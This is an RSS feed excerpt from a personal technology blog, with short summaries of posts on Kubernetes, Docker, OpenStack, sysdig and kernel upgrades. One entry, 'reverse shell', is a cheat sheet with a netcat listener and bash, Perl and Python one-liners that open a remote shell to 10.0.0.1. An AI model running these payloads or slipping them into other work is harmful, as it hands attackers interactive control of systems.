&lt;p>The only requirement is to have a virtual machine running the qemu-guest-agent.&lt;/p></description></item><item><title>Pluribus Networks</title><link>https://feisky.xyz/posts/2015-01-27-pluribus-networks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-pluribus-networks/</guid><description>&lt;p>已经融资9500万美元的&lt;a href="http://www.pluribusnetworks.com">Pluribus&lt;/a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰&lt;/p></description></item><item><title>Programming Resources</title><link>https://feisky.xyz/posts/2015-02-11-ios-blog-resources/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-11-ios-blog-resources/</guid><description>&lt;h2 id="索引">索引&lt;/h2>
&lt;p>&lt;a href="#ANDROID">ANDROID&lt;/a>&lt;/p>
&lt;p>&lt;a href="#ANGULAR">ANGULAR&lt;/a>&lt;/p>
&lt;p>&lt;a href="#BOOTSTRAP">BOOTSTRAP&lt;/a>&lt;/p>
&lt;p>&lt;a href="#C#">C#&lt;/a>&lt;/p>
&lt;p>&lt;a href="#C/C++">C/C++&lt;/a>&lt;/p>
&lt;p>&lt;a href="#CASSANDRA">CASSANDRA&lt;/a>&lt;/p>
&lt;p>&lt;a href="#CHROME">CHROME&lt;/a>&lt;/p>
&lt;p>&lt;a href="#CLOJURE">CLOJURE&lt;/a>&lt;/p>
&lt;p>&lt;a href="#COUCHDB">COUCHDB&lt;/a>&lt;/p>
&lt;p>&lt;a href="#D">D&lt;/a>&lt;/p>
&lt;p>&lt;a href="#DAPPER">DAPPER&lt;/a>&lt;/p>
&lt;p>&lt;a href="#DEVOPS">DEVOPS&lt;/a>&lt;/p>
&lt;p>&lt;a href="#DOCKER">DOCKER&lt;/a>&lt;/p>
&lt;p>&lt;a href="#ERLANG">ERLANG&lt;/a>&lt;/p>
&lt;p>&lt;a href="#FIREFOX">FIREFOX&lt;/a>&lt;/p>
&lt;p>&lt;a href="#GIT">GIT&lt;/a>&lt;/p>
&lt;p>&lt;a href="#GO">GO&lt;/a>&lt;/p>
&lt;p>&lt;a href="#HADOOP">HADOOP&lt;/a>&lt;/p>
&lt;p>&lt;a href="#HASKELL">HASKELL&lt;/a>&lt;/p>
&lt;p>&lt;a href="#HTML5">HTML5&lt;/a>&lt;/p>
&lt;p>&lt;a href="#IOS">IOS&lt;/a>&lt;/p>
&lt;p>&lt;a href="#JAVA">JAVA&lt;/a>&lt;/p>
&lt;p>&lt;a href="#JAVASCRIPT">JAVASCRIPT&lt;/a>&lt;/p>
&lt;p>&lt;a href="#LINUX">LINUX&lt;/a>&lt;/p>
&lt;p>&lt;a href="#LISP">LISP&lt;/a>&lt;/p>
&lt;p>&lt;a href="#LUA">LUA&lt;/a>&lt;/p>
&lt;p>&lt;a href="#MARKDOWN">MARKDOWN&lt;/a>&lt;/p>
&lt;p>&lt;a href="#MATH">MATH&lt;/a>&lt;/p>
&lt;p>&lt;a href="#MEMCACHED">MEMCACHED&lt;/a>&lt;/p>
&lt;p>&lt;a href="#MONGODB">MONGODB&lt;/a>&lt;/p>
&lt;p>&lt;a href="#MYSQL">MYSQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="#NGINX">NGINX&lt;/a>&lt;/p>
&lt;p>&lt;a href="#NODE.JS">NODE.JS&lt;/a>&lt;/p>
&lt;p>&lt;a href="#OPENGL">OPENGL&lt;/a>&lt;/p>
&lt;p>&lt;a href="#OPENSTACK">OPENSTACK&lt;/a>&lt;/p>
&lt;p>&lt;a href="#PERL">PERL&lt;/a>&lt;/p>
&lt;p>&lt;a href="#PHP">PHP&lt;/a>&lt;/p>
&lt;p>&lt;a href="#POSTGRESQL">POSTGRESQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="#PUPPET">PUPPET&lt;/a>&lt;/p>
&lt;p>&lt;a href="#PYTHON">PYTHON&lt;/a>&lt;/p>
&lt;p>&lt;a href="#R">R&lt;/a>&lt;/p>
&lt;p>[RASPBERRY PI](#RASPBERRY PI)&lt;/p>
&lt;p>&lt;a href="#REDIS">REDIS&lt;/a>&lt;/p>
&lt;p>&lt;a href="#REGEX">REGEX&lt;/a>&lt;/p>
&lt;p>&lt;a href="#RUBY">RUBY&lt;/a>&lt;/p>
&lt;p>&lt;a href="#RUST">RUST&lt;/a>&lt;/p>
&lt;p>&lt;a href="#SCALA">SCALA&lt;/a>&lt;/p>
&lt;p>&lt;a href="#SHELL">SHELL&lt;/a>&lt;/p>
&lt;p>&lt;a href="#SPARK">SPARK&lt;/a>&lt;/p>
&lt;p>&lt;a href="#STORM">STORM&lt;/a>&lt;/p>
&lt;p>&lt;a href="#SWIFT">SWIFT&lt;/a>&lt;/p>
&lt;p>&lt;a href="#VARNISH">VARNISH&lt;/a>&lt;/p>
&lt;p>&lt;a href="#VIM">VIM&lt;/a>&lt;/p>
&lt;p>&lt;a href="#WEB%E5%89%8D%E7%AB%AF">WEB前端&lt;/a>&lt;/p>
&lt;p>&lt;a href="#WEB%E5%AE%89%E5%85%A8">WEB安全&lt;/a>&lt;/p>
&lt;p>&lt;a href="#WOLFRAM">WOLFRAM&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E5%BC%80%E6%BA%90%E7%B3%BB%E7%BB%9F">开源系统&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E6%8A%80%E6%9C%AF%E7%A7%91%E6%99%AE">技术科普&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0">数据挖掘/机器学习&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AE%97%E6%B3%95">数据结构/算法&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1">程序设计&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%A4%96">编程之外&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7">编程工具&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90">编程资源&lt;/a>&lt;/p>
&lt;p>&lt;a href="#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84">网站架构&lt;/a>&lt;/p>
&lt;h2 id="android">ANDROID&lt;/h2>
&lt;p>&lt;a href="http://weekly.manong.io/bounce?url=https%3A%2F%2Ftutsplus.com%2Fcourse%2Fandroid-for-the-busy-developer%2F&amp;amp;aid=67&amp;amp;nid=5">面向忙碌开发者的 Android 视频教程（Tuts+）&lt;/a>&lt;/p></description></item><item><title>Python __file__ not defined problem</title><link>https://feisky.xyz/posts/2015-03-05-python-not-defined-problem/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-05-python-not-defined-problem/</guid><description>&lt;p>__file__仅在文件中运行的时候才正常，而在交互式命令行中则需要使用变通的方法：&lt;/p>
&lt;pre tabindex="0">&lt;code>import os
import inspect
import sys
if not hasattr(sys.modules[__name__], &amp;#39;__file__&amp;#39;):
 __file__ = inspect.getfile(inspect.currentframe())

print os.path.dirname(os.path.abspath(__file__))
&lt;/code>&lt;/pre></description></item><item><title>Redhat Atomic Host</title><link>https://feisky.xyz/posts/2015-03-06-redhat-atomic-host/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-06-redhat-atomic-host/</guid><description>&lt;h3 id="introduction">Introduction&lt;/h3>
&lt;p>Red Hat has announced first public beta of &lt;a href="http://www.projectatomic.io/">Red Hat Enterprise Linux 7 Atomic Host&lt;/a>. The beta is available from Red Hat and on Amazon Web Services and Google Compute Platform.&lt;/p>
&lt;p>What can you expect from the Red Hat Enterprise Linux 7 Atomic Host Beta?&lt;/p>
&lt;h4 id="specifically-designed-to-run-containers">Specifically Designed to Run Containers&lt;/h4>
&lt;p>Red Hat Enterprise Linux 7 Atomic Host Beta provides a streamlined host platform that is optimized to run application containers. The software components included in Red Hat Enterprise Linux 7 Atomic Host Beta, as well as the default system tunings, have been designed to enhance the performance, scalability and security of containers, giving you the optimal platform on which to deploy and run application containers.&lt;/p></description></item><item><title>reverse shell</title><link>https://feisky.xyz/posts/2015-01-28-reverse-shell/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-28-reverse-shell/</guid><description>&lt;h3 id="listen-for-8080-first">Listen for 8080 first&lt;/h3>
&lt;pre>
nc -l -p 8080 -vvv
&lt;/pre>
&lt;h3 id="bash">Bash&lt;/h3>
&lt;p>Some versions of &lt;a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell&lt;/a> (this was tested on Ubuntu 10.10):&lt;/p>
&lt;pre>
bash -i >&amp; /dev/tcp/10.0.0.1/8080 0>&amp;1
&lt;/pre>
&lt;h3 id="perl">PERL&lt;/h3>
&lt;p>Here’s a shorter, feature-free version of the &lt;a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell&lt;/a>:&lt;/p>
&lt;pre>
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'
&lt;/pre>
&lt;p>There’s also an &lt;a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here&lt;/a>.&lt;/p>
&lt;h3 id="python">Python&lt;/h3>
&lt;p>This was tested under Linux / Python 2.7:&lt;/p>
&lt;pre>
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
&lt;/pre>
&lt;h3 id="php">PHP&lt;/h3>
&lt;p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…&lt;/p></description></item><item><title>Setting up GRE for Kubernetes</title><link>https://feisky.xyz/posts/2015-03-02-setting-up-gre-for-kubernetes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-02-setting-up-gre-for-kubernetes/</guid><description>&lt;p>首先修改Docker的默认网桥：&lt;/p>
&lt;pre tabindex="0">&lt;code>#停止Docker Daemon进程
systemctl stop docker

#设置默认网桥docker0为down，并删除
ip link set dev docker0 down
brctl delbr docker0

#新建Linux网桥localbr0
brctl addbr localbr0

#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复
ip addr add 10.10.2.1/24 dev localbr0
ip link set dev localbr0 up

echo &amp;#39;OPTIONS=&amp;#34;--bridge localbr0 --iptables=false&amp;#34;&amp;#39;&amp;gt;&amp;gt;/etc/sysconfig/docker
systemctl start Docker
&lt;/code>&lt;/pre>&lt;p>为上述网桥添加GRE连接&lt;/p></description></item><item><title>Something about kubernetes authentication</title><link>https://feisky.xyz/posts/2015-09-23-something-about-kubernetes-authentication/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-09-23-something-about-kubernetes-authentication/</guid><description>&lt;p>You can enable kubernetes authentication by through &lt;a href="https://github.com/kubernetes/kubernetes/blob/master/docs/admin/authentication.md">this documentation&lt;/a>. Then you happily access kube-apiserve by curl:&lt;/p>
&lt;pre tabindex="0">&lt;code># curl -k -N -X GET -H &amp;#34;Authorization: Basic XXXXXXXXXX&amp;#34; http://localhost:8080/api/v1/namespaces/default/pods
{
 &amp;#34;kind&amp;#34;: &amp;#34;PodList&amp;#34;,
 &amp;#34;apiVersion&amp;#34;: &amp;#34;v1&amp;#34;,
 &amp;#34;metadata&amp;#34;: {
 &amp;#34;selfLink&amp;#34;: &amp;#34;/api/v1/namespaces/default/pods&amp;#34;,
 &amp;#34;resourceVersion&amp;#34;: &amp;#34;74034&amp;#34;
 },
 &amp;#34;items&amp;#34;: []
}
&lt;/code>&lt;/pre>&lt;p>Nothing blocks this request! What is wrong? Wait a moment and checkout kubernetes documentation, I find this:&lt;/p>
&lt;blockquote>
&lt;p>The Kubernetes API is served by the Kubernetes apiserver process. Typically,
there is one of these running on a single kubernetes-master node.&lt;/p></description></item><item><title>Stateless Floating IPs</title><link>https://feisky.xyz/posts/2015-06-25-stateless-floating-ips/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-25-stateless-floating-ips/</guid><description>&lt;p>Neutron里面的Floating IPs目前是基于iptables NAT来实现的，它使用ip_conntrack来跟踪所有连接（五元组），而ip_conntrack会大大降低NAT的性能，并且也有一些安全问题（比如&lt;a href="https://review.openstack.org/#/c/124375/">conntrack未释放问题&lt;/a>）。从Floating IPs的作用来看，它只需要完成源目的IP地址的转换即可，完全可以不需要conntrack，因而就有了一个&lt;a href="https://blueprints.launchpad.net/neutron/+spec/stateless-floatingips">Stateless Floating IPs&lt;/a>的BP,&lt;/p></description></item><item><title>sysdig</title><link>https://feisky.xyz/posts/2015-06-24-sysdig/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-24-sysdig/</guid><description>&lt;p>Sysdig captures system calls and other system level events using a linux kernel facility called tracepoints, providing a rich set of real-time, system-level information.&lt;/p>
&lt;p>Sysdig &amp;ldquo;packetizes&amp;rdquo; this information, so that you can do things like save it into trace files and easily filter it, a bit like you would do with tcpdump. This makes it very flexible to explore what processes are doing.&lt;/p>
&lt;p>Sysdig instruments your physical and virtual machines at the OS level by installing into the Linux kernel and capturing system calls and other OS events. Then, using sysdig&amp;rsquo;s command line interface, you can filter and decode these events in order to extract useful information. Sysdig can be used to inspect systems live in real-time, or to generate trace files that can be analyzed at a later stage.&lt;/p></description></item><item><title>Upgrade CentOS kernel</title><link>https://feisky.xyz/posts/upgrade-centos-kernel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/upgrade-centos-kernel/</guid><description>&lt;p>终于耐不住要升级下kernel了，目前epel提供两个版本: kernel-lt (4.4)和kernel-ml (4.5):&lt;/p>
&lt;ul>
&lt;li>The kernel-ml packages are built from the sources available from the &amp;ldquo;mainline stable&amp;rdquo; branch of The Linux Kernel Archives (external link). The kernel configuration is based upon the default RHEL-7 configuration with added functionality enabled as appropriate. The packages are intentionally named kernel-ml so as not to conflict with the RHEL-7 kernels and, as such, they may be installed and updated alongside the regular kernel.&lt;/li>
&lt;li>The kernel-lt packages are built from the sources available from The Linux Kernel Archives (external link), just like the kernel-ml packages. The difference is that kernel-lt is based on a &amp;ldquo;long term support&amp;rdquo; branch and kernel-ml is based on the &amp;ldquo;mainline stable&amp;rdquo; branch.&lt;/li>
&lt;/ul>
&lt;p>升级到lt的步骤很简单：&lt;/p></description></item><item><title>Use kubectl to connect kubernetes cluster</title><link>https://feisky.xyz/posts/2015-11-04-use-kubectl-to-connect-kubernetes-cluster/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-11-04-use-kubectl-to-connect-kubernetes-cluster/</guid><description>&lt;p>&lt;code>kubectl&lt;/code> is the main tool to interact with Kubernetes cluster. It connects to &lt;code>http://localhost:8080&lt;/code> with no auth by default. But how can we use &lt;code>kubectl&lt;/code> with auth?&lt;/p>
&lt;p>Pretty simple, just config &lt;code>kubectl&lt;/code> with dedicated cluster:&lt;/p>
&lt;pre tabindex="0">&lt;code>kubectl config set-credentials default --username=username --password=password
kubectl config set-cluster default --server=https://kubernetes-master:6443 --insecure-skip-tls-verify=true
kubectl config set-context default --cluster=default --user=default
kubectl config use-context default
&lt;/code>&lt;/pre></description></item><item><title>Using cAdvisor to monitor docker</title><link>https://feisky.xyz/posts/2015-03-13-usging-cadvisor-to-monitor-docker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-03-13-usging-cadvisor-to-monitor-docker/</guid><description>&lt;p>cAdvisor (Container Advisor) provides container users an understanding of the resource usage and performance characteristics of their running containers. It is a running daemon that collects, aggregates, processes, and exports information about running containers. Specifically, for each container it keeps resource isolation parameters, historical resource usage, histograms of complete historical resource usage and network statistics. This data is exported by container and machine-wide.&lt;/p>
&lt;p>cAdvisor has native support for Docker containers and should support just about any other container type out of the box. We strive for support accross the board so feel free to open an issue if that is not the case. cAdvisor&amp;rsquo;s container abstraction is based on lmctfy&amp;rsquo;s so containers are inherently nested hierarchically.&lt;/p></description></item><item><title>vagrant</title><link>https://feisky.xyz/posts/2015-01-27-vagrant/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-01-27-vagrant/</guid><description>&lt;p>简易虚拟机管理工具vagrant&lt;/p>
&lt;h3 id="vagrant简介">Vagrant简介&lt;/h3>
&lt;p>Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共享。&lt;/p>
&lt;h3 id="如何安装">如何安装&lt;/h3>
&lt;p>1.安装 VirtualBox&lt;/p>
&lt;p>Vagrant支持VMWare和VirtualBox，不过VMWare版本是收费的，简易使用VirtualBox版本。&lt;/p></description></item><item><title>Weekly reading list (20150607)</title><link>https://feisky.xyz/posts/2015-06-10-weekly-reading-list-20150607/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-10-weekly-reading-list-20150607/</guid><description>&lt;h3 id="openstack-magnum">OpenStack Magnum&lt;/h3>
&lt;p>&lt;a href="http://www.csdn.net/article/2015-06-02/2824827">http://www.csdn.net/article/2015-06-02/2824827&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>Magnum是去年巴黎峰会后开始的一个新项目，专门用来向用户提供容器服务，其最新的架构如图2所示。从去年11月份开始在StackForge提交第一个Patch，到今年3月份进入OpenStack Namespace，Magnum应该是OpenStack社区从StackForge迁移到OpenStack Namespace最快的一个项目。Magnum现在可以为用户提供Kubernetes as a Service和Swarm as a Service，大家应该会很快在L版看到Mesos as a Service。Magnum的一些Contributor，Adrian Otto是Rackspace的杰出工程师，Magnum和Solum的双重PTL；Steven Dake刚刚离开Redhat加入Cisco，他是Heat的创始人，现在Kolla的PTL，同时还在积极推动一个新项目Machine Learning as a Service；Davanum Srinivas (Dims)刚刚从IBM加入Mirantis，现在担任Oslo的PTL。关于他们的时间分配问题，Adrian的原话是会重点放在Magnum。&lt;/p></description></item><item><title>Weekly reading list (20150626)</title><link>https://feisky.xyz/posts/2015-06-24-weekly-reading-list-20150626/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-06-24-weekly-reading-list-20150626/</guid><description>&lt;p>这周最热的就是Dockercon了，列表里面很多都是docker相关的。&lt;/p>
&lt;h2 id="open-container-project-ocp">Open Container Project (OCP)&lt;/h2>
&lt;blockquote>
&lt;p>Today we’re pleased to announce that CoreOS, Docker, and a large group of industry leaders are working together on a standard container format through the formation of the Open Container Project (OCP). OCP is housed under the Linux Foundation, and is chartered to establish common standards for software containers. This announcement means we are starting to see the concepts behind the App Container spec and Docker converge. This is a win for both users of containers and our industry at large.&lt;/p></description></item><item><title>使用Mesos来管理Docker集群</title><link>https://feisky.xyz/posts/2015-02-06-mesosdocker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-02-06-mesosdocker/</guid><description>&lt;h3 id="introduction">Introduction&lt;/h3>
&lt;p>Apache Mesos能够在同样的集群机器上运行多种分布式系统类型，更加动态有效率低共享资源。提供失败侦测，任务发布，任务跟踪，任务监控，低层次资源管理和细粒度的资源共享，可以扩展伸缩到数千个节点。Mesos已经被Twitter用来管理它们的数据中心。&lt;/p></description></item></channel></rss>